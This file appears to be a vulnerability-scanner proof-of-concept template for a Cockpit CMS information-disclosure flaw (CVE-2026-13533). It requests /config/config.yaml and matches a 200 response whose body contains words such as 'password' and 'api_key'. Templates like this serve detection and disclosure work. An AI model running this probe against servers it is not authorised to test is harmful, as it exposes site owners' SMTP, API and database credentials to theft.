[info]
id = "POC-AVE-2026-00012"
name = "Cockpit CMS config.yaml 文件泄露 PoC"
author = "AVE"
severity = "medium"
tags = ["cve-2026-13533", "cockpit", "cms", "information-disclosure", "cwe-425", "cwe-552"]
description = "Cockpit CMS 受影响版本中 /config/config.yaml 文件未受 .htaccess 保护，攻击者可直接通过 HTTP GET 请求获取包含 SMTP 凭证、API 密钥、数据库配置等敏感信息的配置文件。"
vuln_id = ["CVE-2026-13533", "AVE-2026-00012"]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/config/config.yaml"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["SMTP", "api_key", "database", "password", "smtp"]
expect = true
